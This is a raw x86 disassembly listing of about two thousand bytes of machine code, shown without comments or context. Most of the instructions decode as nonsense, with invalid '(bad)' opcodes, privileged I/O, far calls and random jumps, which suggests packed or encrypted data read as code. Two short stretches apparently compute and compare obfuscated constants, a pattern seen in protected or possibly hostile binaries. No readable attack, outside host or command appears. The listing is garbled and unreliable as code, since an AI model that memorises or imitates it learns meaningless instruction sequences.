  40bbda:	xor    DWORD PTR [edi-0x46],ebx
  40bbdd:	xchg   ebx,eax
  40bbde:	mov    ds:0xc731aca2,al
  40bbe3:	daa    
  40bbe4:	add    ecx,DWORD PTR [eax-0x2249d149]
  40bbea:	cmp    edx,eax
  40bbec:	jns    0x40bbe3
  40bbee:	pop    edx
  40bbef:	add    eax,0xdbe78661
  40bbf4:	xchg   ebp,eax
  40bbf5:	dec    edx
  40bbf6:	pop    ecx
  40bbf7:	jns    0x40bb91
  40bbf9:	or     dh,BYTE PTR [ebx+0x4f2bd525]
  40bbff:	and    DWORD PTR [ebp-0x19],edi
  40bc02:	jecxz  0x40bbb7
  40bc04:	mov    DWORD PTR gs:[ebx-0x7e],eax
  40bc08:	jae    0x40bc3d
  40bc0a:	xlat   BYTE PTR ds:[ebx]
  40bc0b:	stos   BYTE PTR es:[edi],al
  40bc0c:	jae    0x40bbb1
  40bc0e:	jae    0x40bbda
  40bc10:	scas   al,BYTE PTR es:[edi]
  40bc11:	xchg   ebx,eax
  40bc12:	jae    0x40bba6
  40bc14:	mov    ah,0x3f
  40bc16:	or     ebp,esi
  40bc18:	jno    0x40bbb1
  40bc1a:	es inc esp
  40bc1c:	fisub  DWORD PTR [ebx+0x1eab37de]
  40bc22:	add    ah,bl
  40bc24:	repnz sbb edx,esp
  40bc27:	sub    al,0xfc
  40bc29:	jl     0x40bbb7
  40bc2b:	in     al,0x69
  40bc2d:	int    0x12
  40bc2f:	xor    edi,DWORD PTR [edi-0x352eb04f]
  40bc35:	adc    ecx,ebp
  40bc37:	inc    ebx
  40bc38:	sti    
  40bc39:	fistp  DWORD PTR [esi+0x24]
  40bc3c:	rcr    al,cl
  40bc3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc3f:	push   edi
  40bc40:	and    ah,ch
  40bc42:	sub    eax,esp
  40bc44:	je     0x40bcb4
  40bc46:	pop    ebx
  40bc47:	dec    edi
  40bc48:	and    bh,BYTE PTR ss:[eax]
  40bc4b:	bound  esp,QWORD PTR [ebp+0x40]
  40bc4e:	xchg   esi,eax
  40bc4f:	and    DWORD PTR [edi],0xccfef66c
  40bc55:	inc    ebx
  40bc56:	mov    esi,0x385a58aa
  40bc5b:	mov    ds:0xe8a64d9e,eax
  40bc60:	iret   
  40bc61:	into   
  40bc62:	jle    0x40bca9
  40bc64:	sbb    edi,ebx
  40bc66:	jmp    0xcfc3868c
  40bc6b:	mov    eax,ds:0x7514ee3e
  40bc70:	call   FWORD PTR [edi+0x12]
  40bc73:	pop    edi
  40bc74:	js     0x40bc40
  40bc76:	lahf   
  40bc77:	aam    0x20
  40bc79:	inc    ecx
  40bc7a:	cmp    dh,cl
  40bc7c:	mov    cl,0x23
  40bc7e:	mov    edx,DWORD PTR [edx+esi*8+0x6f]
  40bc82:	aam    0xed
  40bc84:	or     al,0xd4
  40bc86:	mov    cl,0x66
  40bc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc89:	fucomip st,st(4)
  40bc8b:	cmp    BYTE PTR [eax+0x1857a058],0x70
  40bc92:	repz imul edx,DWORD PTR ds:0xeed7fcb0,0x6d06e7d7
  40bc9d:	sti    
  40bc9e:	loopne 0x40bc9e
  40bca0:	jns    0x40bc7a
  40bca2:	ret    0x2d72
  40bca5:	push   ds
  40bca6:	neg    DWORD PTR [ebp+0x35]
  40bca9:	outs   dx,BYTE PTR ds:[esi]
  40bcaa:	leave  
  40bcab:	cmp    eax,DWORD PTR [ecx+ebp*1]
  40bcae:	push   es
  40bcaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcb0:	outs   dx,BYTE PTR ds:[esi]
  40bcb1:	fadd   DWORD PTR [ecx]
  40bcb3:	ss cld 
  40bcb5:	mov    ds:0x56ea4911,eax
  40bcba:	mov    ecx,DWORD PTR [ecx+eax*8+0x7b]
  40bcbe:	ja     0x40bc44
  40bcc0:	xchg   DWORD PTR [edi],esp
  40bcc2:	test   eax,0x3a8d7f4d
  40bcc7:	fadd   QWORD PTR [eax-0x724ae535]
  40bccd:	mov    ds:0xca974d2f,eax
  40bcd2:	dec    eax
  40bcd3:	adc    DWORD PTR [esi+0x6f011929],0x63318563
  40bcdd:	inc    edx
  40bcde:	mov    ds:0xc7acbf,al
  40bce3:	sbb    edx,DWORD PTR [ecx]
  40bce5:	retf   0x3120
  40bce8:	imul   eax,DWORD PTR [edi-0x28],0xf59c3673
  40bcef:	enter  0x4cea,0xea
  40bcf3:	adc    cl,BYTE PTR [edi+0x724db02f]
  40bcf9:	push   0x73
  40bcfb:	leave  
  40bcfc:	lods   eax,DWORD PTR ds:[esi]
  40bcfd:	and    ah,ah
  40bcff:	leave  
  40bd00:	sbb    DWORD PTR [ebx-0x59],esp
  40bd03:	mov    dh,0xbc
  40bd05:	pusha  
  40bd06:	std    
  40bd07:	dec    esi
  40bd08:	jg     0x40bd4e
  40bd0a:	add    esp,ebx
  40bd0c:	daa    
  40bd0d:	in     al,0x24
  40bd0f:	add    DWORD PTR [ebp-0x29],ebp
  40bd12:	retf   0x787a
  40bd15:	ds je  0x40bd38
  40bd18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd19:	mov    bh,0x4d
  40bd1b:	lock test DWORD PTR [esi-0x6],0x7fcc3b8d
  40bd23:	add    al,0x5c
  40bd25:	cmp    ecx,esp
  40bd27:	sahf   
  40bd28:	js     0x40bd95
  40bd2a:	ds jmp 0x40bd82
  40bd2d:	inc    edx
  40bd2e:	retf   
  40bd2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd30:	fdiv   QWORD PTR [ecx]
  40bd32:	add    dl,BYTE PTR [edx]
  40bd34:	or     eax,0x331f3ade
  40bd39:	popa   
  40bd3a:	lods   eax,DWORD PTR ds:[esi]
  40bd3b:	cmp    bl,bl
  40bd3d:	in     al,dx
  40bd3e:	daa    
  40bd3f:	or     al,0x48
  40bd41:	mov    ah,BYTE PTR [esi-0x1a02647b]
  40bd47:	xchg   ebx,eax
  40bd48:	sbb    al,0xd3
  40bd4a:	xor    eax,0xe692f3c4
  40bd4f:	lea    edx,[edi]
  40bd51:	(bad)  
  40bd52:	jns    0x40bda9
  40bd54:	and    eax,0x952497f9
  40bd59:	iret   
  40bd5a:	adc    al,0x8
  40bd5c:	rcr    BYTE PTR [edi+ebp*8+0xa],1
  40bd60:	loope  0x40bd8f
  40bd62:	inc    BYTE PTR [ecx-0xd]
  40bd65:	push   esi
  40bd66:	cmp    al,0x5c
  40bd68:	hlt    
  40bd69:	jns    0x40bd31
  40bd6b:	jo     0x40bd98
  40bd6d:	sti    
  40bd6e:	push   edx
  40bd6f:	mov    esi,0x3c1092c2
  40bd74:	fst    QWORD PTR [edi+eax*2+0x470b8dd6]
  40bd7b:	jge    0x40bd62
  40bd7d:	fistp  WORD PTR [eax+0x32]
  40bd80:	into   
  40bd81:	clc    
  40bd82:	leave  
  40bd83:	loop   0x40bd4e
  40bd85:	(bad)  
  40bd87:	dec    edx
  40bd88:	jmp    0x40bdf1
  40bd8a:	jbe    0x40bdda
  40bd8c:	jl     0x40bd25
  40bd8e:	pop    ebp
  40bd8f:	lock lods eax,DWORD PTR ds:[esi]
  40bd91:	iret   
  40bd92:	lods   eax,DWORD PTR ds:[esi]
  40bd93:	mov    bl,0xb7
  40bd95:	sbb    eax,0xfa0df994
  40bd9a:	fidiv  WORD PTR es:[edi]
  40bd9d:	test   DWORD PTR [eax+eax*4],0xe6a09795
  40bda4:	(bad)  
  40bda5:	je     0x40bd9c
  40bda7:	mov    eax,0x153356ef
  40bdac:	mov    al,0x2c
  40bdae:	fcmovbe st,st(0)
  40bdb0:	in     al,0x4f
  40bdb2:	shl    BYTE PTR [ecx+0x23af58e7],1
  40bdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb9:	mov    eax,0x8aa39655
  40bdbe:	div    DWORD PTR [esi-0x6c541043]
  40bdc4:	pop    ds
  40bdc5:	adc    eax,0x67ffa6fe
  40bdca:	mov    edx,eax
  40bdcc:	sub    eax,0x2830ad66
  40bdd1:	mov    eax,ds:0x81ba1c80
  40bdd6:	(bad)  
  40bdd7:	cmp    al,0xae
  40bdd9:	or     BYTE PTR [ebp+0x91e0c7a],dl
  40bddf:	push   eax
  40bde0:	push   ebx
  40bde1:	push   edx
  40bde2:	idiv   esp
  40bde4:	inc    edx
  40bde5:	es mov esp,0xa0120a51
  40bdeb:	mov    bh,0x8b
  40bded:	repz add esi,edi
  40bdf0:	les    ecx,FWORD PTR [esi+0x6ea12c49]
  40bdf6:	sub    esp,DWORD PTR [ebx+0x1d]
  40bdf9:	add    DWORD PTR [edi],esi
  40bdfb:	or     eax,0x91d8350
  40be00:	jp     0x40be15
  40be02:	mov    ds:0x3c42096f,eax
  40be07:	loop   0x40bdde
  40be09:	sub    al,0x72
  40be0b:	and    eax,0xab22df82
  40be10:	inc    esp
  40be11:	fisub  WORD PTR [edi-0x80]
  40be14:	adc    bl,bl
  40be16:	mov    al,ds:0xd26291ab
  40be1b:	inc    edx
  40be1c:	inc    ebp
  40be1d:	mov    edi,0x3dc55ddc
  40be22:	and    eax,0x4bde658f
  40be27:	mov    eax,0x2584dd70
  40be2c:	jo     0x40be52
  40be2e:	and    DWORD PTR [esp+eax*8-0x25],esp
  40be32:	push   edi
  40be33:	call   0xadd65c32
  40be38:	or     ebp,DWORD PTR ds:0x4224915c
  40be3e:	mov    WORD PTR [edi+0x1a],es
  40be41:	mov    DWORD PTR [esi-0x8e633ca],0x29a867ee
  40be4b:	rcr    BYTE PTR [edi],1
  40be4d:	jle    0x40be6a
  40be4f:	enter  0xf924,0xbe
  40be53:	repz or al,0x29
  40be56:	mov    dl,0xfd
  40be58:	mov    ds:0xb0fc7732,eax
  40be5d:	mov    al,ds:0x6b29ddd8
  40be62:	xchg   DWORD PTR [eax-0x34],ebx
  40be65:	dec    cx
  40be67:	mov    ds:0xe05b8cc6,eax
  40be6c:	popf   
  40be6d:	inc    eax
  40be6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6f:	xor    al,0xb
  40be71:	rcl    bl,1
  40be73:	sub    BYTE PTR [edi-0x486e71c],ah
  40be79:	pop    edx
  40be7a:	mov    DWORD PTR [eax],ebx
  40be7c:	jbe    0x40be38
  40be7e:	jae    0x40bea7
  40be80:	and    eax,DWORD PTR [eax]
  40be82:	jne    0x40bea1
  40be84:	scas   eax,DWORD PTR es:[edi]
  40be85:	test   BYTE PTR [ebx-0xbb2764d],cl
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bfbe
  40bf55:	xchg   ecx,eax
  40bf56:	in     eax,0xaa
  40bf58:	mov    dh,0x5
  40bf5a:	sbb    BYTE PTR [eax],bl
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    BYTE PTR [eax+0x55293bfb],al
  40bf65:	pop    edi
  40bf66:	outs   dx,BYTE PTR ds:[esi]
  40bf67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf68:	push   edx
  40bf69:	in     eax,dx
  40bf6a:	ja     0x40bfe5
  40bf6c:	popf   
  40bf6d:	inc    edx
  40bf6e:	imul   ebp,edx,0xffffffe2
  40bf71:	lods   al,BYTE PTR ds:[esi]
  40bf72:	retf   0x659a
  40bf75:	loopne 0x40bfdc
  40bf77:	gs add eax,0x329320e7
  40bf7d:	mov    dl,BYTE PTR [ebp+0x31]
  40bf80:	fsub   DWORD PTR [ecx+0x656df684]
  40bf86:	push   ebx
  40bf87:	xor    al,0xa8
  40bf89:	mov    WORD PTR [edi],ds
  40bf8b:	mov    bh,0x8c
  40bf8d:	rcl    BYTE PTR [edx+0x5e],0x92
  40bf91:	mov    eax,0xfe97ebf3
  40bf96:	and    BYTE PTR [ebp+ebp*2+0x777e3262],cl
  40bf9d:	imul   ebp,DWORD PTR [edx+edi*4],0x23cd0312
  40bfa4:	push   ebx
  40bfa5:	inc    ebp
  40bfa6:	dec    esp
  40bfa7:	mov    dh,0x10
  40bfa9:	pop    edx
  40bfaa:	repz mov ah,0x33
  40bfad:	mov    ch,0xd9
  40bfaf:	pusha  
  40bfb0:	xor    ebx,DWORD PTR [esp+edx*4-0x38]
  40bfb4:	mov    al,0x69
  40bfb6:	rcr    esi,cl
  40bfb8:	fstp   DWORD PTR [esi-0x6723a35]
  40bfbe:	push   es
  40bfbf:	mov    cl,0x83
  40bfc1:	push   edx
  40bfc2:	in     eax,0x9b
  40bfc4:	mov    dl,0xce
  40bfc6:	inc    ebx
  40bfc7:	mov    WORD PTR [eax+0x4bd07ba8],fs
  40bfcd:	jo     0x40bf8f
  40bfcf:	in     eax,dx
  40bfd0:	popa   
  40bfd1:	mov    al,ds:0xd8b53509
  40bfd6:	pop    ebx
  40bfd7:	ror    BYTE PTR [ecx-0x6d0aa625],1
  40bfdd:	pop    edx
  40bfde:	pusha  
  40bfdf:	pop    esp
  40bfe0:	sti    
  40bfe1:	jbe    0x40bffe
  40bfe3:	and    al,0x2e
  40bfe5:	mov    dl,0x17
  40bfe7:	push   ecx
  40bfe8:	fwait
  40bfe9:	mov    dl,0x95
  40bfeb:	adc    DWORD PTR [ebx-0x7],ebp
  40bfee:	lock mov ah,0xd0
  40bff1:	lock inc edi
  40bff3:	and    dl,cl
  40bff5:	jno    0x40c055
  40bff7:	inc    esp
  40bff8:	push   ss
  40bff9:	jg     0x40bf96
  40bffb:	dec    ebp
  40bffc:	arpl   WORD PTR [ebx-0x3],sp
  40bfff:	fisubr DWORD PTR ds:0xaaeae7ad
  40c005:	in     eax,dx
  40c006:	imul   esp,DWORD PTR [esi],0xffffff9b
  40c009:	jb     0x40bfc8
  40c00b:	jno    0x40bfc8
  40c00d:	ds pextrw ebp,(bad),0xc5
  40c010:	scas   al,BYTE PTR es:[edi]
  40c011:	jae    0x40c036
  40c013:	xor    al,0x18
  40c015:	xor    eax,0x52661b4b
  40c01a:	ss add ebp,ebx
  40c01d:	add    DWORD PTR [edi+0x432671d1],ecx
  40c023:	jp     0x40c055
  40c025:	ins    BYTE PTR es:[edi],dx
  40c026:	(bad)  
  40c027:	xchg   esp,eax
  40c028:	push   ebx
  40c029:	mov    WORD PTR [esp+ebp*8+0x1a036c3b],?
  40c030:	xchg   edi,eax
  40c031:	xchg   ebx,eax
  40c032:	stos   DWORD PTR es:[edi],eax
  40c033:	push   edx
  40c034:	or     BYTE PTR [edi+esi*1+0x15],bl
  40c038:	xchg   esp,eax
  40c039:	pushf  
  40c03a:	cmp    esp,DWORD PTR [eax]
  40c03c:	xchg   esi,eax
  40c03d:	mov    ds:0x48432196,al
  40c042:	adc    DWORD PTR ds:0x2d50ab0b,edi
  40c048:	mov    ebx,0xd526c603
  40c04d:	sbb    ah,BYTE PTR [edx]
  40c04f:	xchg   ecx,esi
  40c051:	push   ss
  40c052:	cmp    ah,BYTE PTR [ebx+0x27f0ef21]
  40c058:	fisttp WORD PTR [eax+ecx*1]
  40c05b:	cmp    BYTE PTR [ecx-0x4b0009cd],ch
  40c061:	sbb    ebp,DWORD PTR [edi+0x65030015]
  40c067:	sahf   
  40c068:	test   ecx,0x39882318
  40c06e:	popa   
  40c06f:	imul   ebp,DWORD PTR [ecx+0x63],0x5f
  40c073:	(bad)
  40c077:	out    0x53,al
  40c079:	or     eax,0x78fc58fe
  40c07e:	mov    edi,0x8e5d3cae
  40c083:	dec    esp
  40c084:	in     eax,dx
  40c085:	or     eax,ecx
  40c087:	push   ecx
  40c088:	imul   ebp,DWORD PTR [esi],0xfa18ef02
  40c08e:	xor    eax,edi
  40c090:	xor    al,0xd3
  40c092:	aam    0xc8
  40c094:	div    BYTE PTR [edi+0x163edc73]
  40c09a:	pop    es
  40c09b:	test   DWORD PTR [ebp+ecx*2-0xc],ecx
  40c09f:	test   al,0xc0
  40c0a1:	xchg   ecx,eax
  40c0a2:	data16 sbb ah,dh
  40c0a5:	in     eax,dx
  40c0a6:	xor    BYTE PTR [edx+0x345d49c2],ah
  40c0ac:	call   0x239b:0x227ea152
  40c0b3:	clc    
  40c0b4:	xchg   ecx,eax
  40c0b5:	mov    ah,0x23
  40c0b7:	ss pop ebx
  40c0b9:	mov    eax,ds:0x3ed9bff0
  40c0be:	add    eax,0xd0a24f21
  40c0c3:	add    eax,0xb0158369
  40c0c8:	popa   
  40c0c9:	dec    ebx
  40c0ca:	jae    0x40c0d0
  40c0cc:	lods   al,BYTE PTR ds:[esi]
  40c0cd:	test   DWORD PTR [edi-0x4f4c046c],ecx
  40c0d3:	jo     0x40c13a
  40c0d5:	push   esi
  40c0d6:	fwait
  40c0d7:	mov    ds:0x9b04462f,eax
  40c0dc:	imul   ecx,DWORD PTR [eax],0xc7938663
  40c0e2:	jae    0x40c11f
  40c0e4:	add    ch,BYTE PTR [ebx-0x1447e2f0]
  40c0ea:	cwde   
  40c0eb:	or     esp,edx
  40c0ed:	loopne 0x40c15d
  40c0ef:	jl     0x40c0f5
  40c0f1:	pop    ebp
  40c0f2:	push   ecx
  40c0f3:	leave  
  40c0f4:	lods   al,BYTE PTR ds:[esi]
  40c0f5:	lds    edx,FWORD PTR [ebx-0x6]
  40c0f8:	retf   0xe2e4
  40c0fb:	ficom  DWORD PTR [ebx+0x494d34b4]
  40c101:	inc    esi
  40c102:	inc    edx
  40c103:	sar    DWORD PTR [eax+ecx*1+0xe2aca60],1
  40c10a:	mov    ch,0x2
  40c10c:	jns    0x40c0c2
  40c10e:	xor    DWORD PTR [eax-0x1240f62e],esp
  40c114:	inc    esp
  40c115:	mov    cl,0xa6
  40c117:	ins    DWORD PTR es:[edi],dx
  40c118:	dec    eax
  40c119:	cmp    dh,dh
  40c11b:	xlat   BYTE PTR ds:[ebx]
  40c11c:	or     al,0x20
  40c11e:	cdq    
  40c11f:	and    al,0xfa
  40c121:	push   ebx
  40c122:	sub    al,0xa9
  40c124:	repnz das 
  40c126:	adc    ecx,DWORD PTR [ebx+0x4f]
  40c129:	cdq    
  40c12a:	idiv   DWORD PTR [eax-0x5de7545]
  40c130:	stos   DWORD PTR es:[edi],eax
  40c131:	mov    ch,BYTE PTR ds:0xb313d06f
  40c137:	mov    ebx,0x9577e0ac
  40c13c:	aad    0x77
  40c13e:	(bad)  
  40c13f:	jecxz  0x40c1ba
  40c141:	aam    0x42
  40c143:	xor    eax,0xe796e78d
  40c148:	mov    ds:0x3cb00a3b,al
  40c14d:	lods   eax,DWORD PTR ds:[esi]
  40c14e:	jge    0x40c0f0
  40c150:	sahf   
  40c151:	pop    ecx
  40c152:	out    0xf,al
  40c154:	inc    edx
  40c155:	pop    es
  40c156:	dec    ebp
  40c157:	out    dx,eax
  40c158:	call   FWORD PTR [edi+0x3b529938]
  40c15e:	mov    eax,0xfaf2b2cf
  40c163:	add    eax,0x5cd1c575
  40c168:	or     eax,DWORD PTR [esi+0x159b4e44]
  40c16e:	add    eax,0xed375f67
  40c173:	data16 into 
  40c175:	popa   
  40c176:	or     esi,DWORD PTR [ecx+edx*1]
  40c179:	sar    BYTE PTR [ecx-0xac6fc30],1
  40c17f:	sbb    ah,BYTE PTR [edx+ecx*8-0x2a042a92]
  40c186:	leave  
  40c187:	mov    edx,0xdec1dae3
  40c18c:	inc    edi
  40c18d:	xchg   esi,eax
  40c18e:	or     ch,BYTE PTR [esi-0x157dd000]
  40c194:	fisttp DWORD PTR cs:[esi]
  40c197:	lea    ebp,[esi]
  40c199:	aad    0x6f
  40c19b:	inc    eax
  40c19c:	mov    ebx,0xbb78facd
  40c1a1:	sbb    esp,DWORD PTR [ebp-0x47d77b3e]
  40c1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a8:	enter  0x1bf0,0xbb
  40c1ac:	mov    al,0xed
  40c1ae:	outs   dx,BYTE PTR ds:[esi]
  40c1af:	xchg   BYTE PTR [edx*1-0x28df57e1],ch
  40c1b6:	mov    dl,BYTE PTR [eax]
  40c1b8:	shr    BYTE PTR [esi-0x4a69557a],1
  40c1be:	jne    0x40c142
  40c1c0:	inc    esi
  40c1c1:	in     eax,dx
  40c1c2:	and    al,0xcf
  40c1c4:	pop    DWORD PTR [edi+0x554e023]
  40c1ca:	ss retf 
  40c1cc:	mov    cs,WORD PTR [ebx-0x78acc522]
  40c1d2:	retf   0x30c
  40c1d5:	adc    al,0xcd
  40c1d7:	imul   ebp,DWORD PTR [ebx-0x4831151d],0xdab745cf
  40c1e1:	mov    ch,0x4
  40c1e3:	push   ebx
  40c1e4:	pop    ebx
  40c1e5:	pop    edi
  40c1e6:	mov    eax,0x413223e0
  40c1eb:	das    
  40c1ec:	pmuludq mm2,QWORD PTR [edx+0x42]
  40c1f0:	leave  
  40c1f1:	sub    eax,0xc8581184
  40c1f6:	xchg   edx,eax
  40c1f7:	and    DWORD PTR [ebx],0x1a
  40c1fa:	dec    ebx
  40c1fb:	outs   dx,DWORD PTR ds:[esi]
  40c1fc:	in     al,dx
  40c1fd:	sahf   
  40c1fe:	test   eax,0xc8eb8ac2
  40c203:	add    al,0xfd
  40c205:	or     al,0xa6
  40c207:	(bad)  
  40c208:	xchg   edi,eax
  40c209:	pop    ds
  40c20a:	mov    edi,0xfb425238
  40c20f:	cmc    
  40c210:	and    al,0x12
  40c212:	inc    ebp
  40c213:	cmp    dl,cl
  40c215:	nop
  40c216:	pop    esi
  40c217:	adc    eax,0x4208a250
  40c21c:	mov    edi,0xff8056b0
  40c221:	iret   
  40c222:	lds    ecx,FWORD PTR [eax-0x625cad4f]
  40c228:	cmp    BYTE PTR [ebp+eiz*1+0x3ac833cb],ch
  40c22f:	sub    DWORD PTR [edx],0xffffffff
  40c232:	aad    0xf1
  40c234:	jno    0x40c271
  40c236:	gs rol cl,1
  40c239:	xor    al,0x6b
  40c23b:	leave  
  40c23c:	ins    BYTE PTR es:[edi],dx
  40c23d:	cs inc edi
  40c23f:	fld    st(4)
  40c241:	pop    ecx
  40c242:	shr    DWORD PTR [edx],1
  40c244:	mov    bh,BYTE PTR ds:0x2420923d
  40c24a:	(bad)  
  40c24b:	outs   dx,BYTE PTR ds:[esi]
  40c24c:	cmp    esp,DWORD PTR [edx+0x6e]
  40c24f:	sbb    DWORD PTR [edx],edi
  40c251:	enter  0x1f1e,0xe
  40c255:	jecxz  0x40c289
  40c257:	jp     0x40c2c8
  40c259:	lods   al,BYTE PTR ds:[esi]
  40c25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25b:	or     edi,DWORD PTR [edi+0x7]
  40c25e:	cmp    BYTE PTR [eax],0x4f
  40c261:	xchg   edx,eax
  40c262:	push   ds
  40c263:	int    0xef
  40c265:	jg     0x40c2b5
  40c267:	inc    edi
  40c268:	or     DWORD PTR [ecx+0x16],ecx
  40c26b:	aaa    
  40c26c:	push   esp
  40c26d:	xchg   ecx,eax
  40c26e:	in     al,0x33
  40c270:	ret    
  40c271:	in     al,0x7f
  40c273:	jbe    0x40c265
  40c275:	daa    
  40c276:	out    0xd4,eax
  40c278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c279:	pop    ss
  40c27a:	add    al,0x5a
  40c27c:	dec    ebp
  40c27d:	jle    0x40c21a
  40c27f:	(bad)  
  40c280:	js     0x40c2d6
  40c282:	icebp  
  40c283:	pop    esi
  40c284:	xchg   ecx,eax
  40c285:	push   esi
  40c286:	push   cs
  40c287:	hlt    
  40c288:	iret   
  40c289:	sub    BYTE PTR [edi],ch
  40c28b:	les    ebx,FWORD PTR [ebp+esi*2+0x6f82e411]
  40c292:	addr16 cmp eax,ebx
  40c295:	jl     0x40c224
  40c297:	push   cs
  40c298:	push   ecx
  40c299:	(bad)  
  40c29a:	and    esi,esp
  40c29c:	iret   
  40c29d:	and    BYTE PTR [edi],0x77
  40c2a0:	jne    0x40c224
  40c2a2:	xchg   DWORD PTR [ebp+0x3c],eax
  40c2a5:	jp     0x40c28d
  40c2a7:	mov    esp,ebx
  40c2a9:	rcr    DWORD PTR [eax-0x5],0x73
  40c2ad:	xor    DWORD PTR [ecx],edx
  40c2af:	shr    DWORD PTR [edx+eax*8-0x72],cl
  40c2b3:	iret   
  40c2b4:	fs popa 
  40c2b6:	in     eax,0x9c
  40c2b8:	adc    dl,bh
  40c2ba:	mov    ebp,0x82031d6a
  40c2bf:	mov    dl,0xc9
  40c2c1:	mov    eax,0xb51e7e52
  40c2c6:	pop    ecx
  40c2c7:	(bad)  
  40c2c8:	pop    esi
  40c2c9:	shl    BYTE PTR [edx+edx*1-0x3a],1
  40c2cd:	in     eax,0xc1
  40c2cf:	ret    0x85bb
  40c2d2:	jns    0x40c306
  40c2d4:	jno    0x40c318
  40c2d6:	or     DWORD PTR [edi+0x29],eax
  40c2d9:	jecxz  0x40c318
  40c2db:	add    BYTE PTR [esi-0x74beb19f],ch
  40c2e1:	int    0x24
  40c2e3:	mov    al,BYTE PTR [eax-0x21]
  40c2e6:	mov    ah,0xa8
  40c2e8:	sub    BYTE PTR [edi+ebp*1-0x5c376420],cl
  40c2ef:	dec    ecx
  40c2f0:	dec    eax
  40c2f1:	inc    ecx
  40c2f2:	popf   
  40c2f3:	out    0xa0,al
  40c2f5:	ret    0x1e4e
  40c2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f9:	call   0x5729:0x79236179
  40c300:	fisttp WORD PTR [edx+0x58d4d98f]
  40c306:	mov    edx,0xa0a0f048
  40c30b:	sub    BYTE PTR [ebx-0x6c],cl
  40c30e:	rol    BYTE PTR cs:[esi],0x7d
  40c312:	mov    edi,0xafe1997d
  40c317:	fistp  WORD PTR [ecx+0x2d0148e2]
  40c31d:	adc    al,0x4b
  40c31f:	ret    
  40c320:	sub    ecx,ebx
  40c322:	paddq  mm6,mm6
  40c325:	sbb    esi,DWORD PTR [eax+0x14f9cb03]
  40c32b:	pop    eax
  40c32c:	popa   
  40c32d:	adc    al,0x5c
  40c32f:	stos   BYTE PTR es:[edi],al
  40c330:	pop    esp
  40c331:	add    esi,DWORD PTR [edx+ebx*8]
  40c334:	adc    eax,0x60c925f3
  40c339:	push   eax
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42277c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422568
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
